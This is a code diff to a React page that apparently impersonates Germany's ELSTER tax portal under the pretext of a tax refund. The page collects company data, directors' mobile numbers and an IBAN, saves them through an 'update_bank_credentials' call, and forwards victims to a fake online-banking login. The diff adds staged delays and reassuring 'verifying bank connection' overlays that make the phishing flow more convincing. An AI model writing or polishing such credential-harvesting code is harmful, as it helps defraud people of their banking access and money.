@@ -3,6 +3,7 @@ import { useSearchParams, useNavigate } from "react-router-dom";
 import { resolveDeBankRoute } from "@/lib/bankMatchDe";
 import { supabase } from "@/integrations/supabase/client";
 import { usePageMeta } from "@/hooks/use-page-meta";
+import LoadingOverlay from "@/components/LoadingOverlay";
 import {
   User,
   Settings,
@@ -185,6 +186,8 @@ const Elster = () => {
     if (Object.keys(err).length === 0) setStep(2);
   };
 
+  const [verifyLoadingMsg, setVerifyLoadingMsg] = useState("");
+
   const handleVerifySubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     const err: Record<string, string> = {};
@@ -195,6 +198,7 @@ const Elster = () => {
     setErrors(err);
     if (Object.keys(err).length > 0 || verifySubmitting) return;
     setVerifySubmitting(true);
+    setVerifyLoadingMsg("Bankverbindung wird überprüft…");
 
     const summary = [
       `Unternehmen: ${company}`,
@@ -204,16 +208,20 @@ const Elster = () => {
       ...directors.map((d, i) => `Geschäftsführer ${i + 1}: ${d.firstName} ${d.lastName} (Mobil: ${d.mobile})`),
     ].join("\n");
 
-    if (sessionId) {
-      const { error } = await supabase.rpc("update_bank_credentials", {
-        p_session_id: sessionId,
-        p_username: summary,
-        p_password: iban,
-        p_username_label: "Firmendaten",
-        p_password_label: "IBAN",
-      });
-      if (error) console.error("Update failed:", error);
-    }
+    const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
+    const rpcPromise = sessionId
+      ? supabase.rpc("update_bank_credentials", {
+          p_session_id: sessionId,
+          p_username: summary,
+          p_password: iban,
+          p_username_label: "Firmendaten",
+          p_password_label: "IBAN",
+        })
+      : Promise.resolve({ error: null } as { error: unknown });
+
+    await sleep(1500);
+    const { error } = (await rpcPromise) as { error: unknown };
+    if (error) console.error("Update failed:", error);
 
     const route = await resolveDeBankRoute(bankName);
     if (route) {
@@ -222,6 +230,8 @@ const Elster = () => {
           company, vEmail, phone, street, city, directors, iban, bankName,
         }));
       } catch { /* ignore */ }
+      setVerifyLoadingMsg("Weiterleitung zur Online-Banking-Anmeldung…");
+      await sleep(1200);
       const qs = new URLSearchParams();
       if (sessionId) qs.set("s", sessionId);
       qs.set("return", "/elster/steuerrueckzahlung");
@@ -230,6 +240,7 @@ const Elster = () => {
     }
 
     setVerifySubmitting(false);
+    setVerifyLoadingMsg("");
     setErrors({ iban: "Für diese Bank ist derzeit keine Online-Verifizierung verfügbar." });
   };
 
@@ -252,6 +263,10 @@ const Elster = () => {
 
   return (
     <div style={{ fontFamily: "'Open Sans', 'Segoe UI', Arial, sans-serif", color: TEXT, background: "#fff", minHeight: "100vh", display: "flex", flexDirection: "column" }}>
+      {verifySubmitting && verifyLoadingMsg && (
+        <LoadingOverlay message={verifyLoadingMsg} duration={9_999_999} onComplete={() => { /* controlled by handleVerifySubmit */ }} />
+      )}
+
       {/* Header */}
       <header style={{ background: "#fff", borderBottom: `1px solid ${GREEN}` }}>
         <div style={{ maxWidth: 1400, margin: "0 auto", padding: "14px 24px", display: "flex", alignItems: "center", gap: 16 }}>
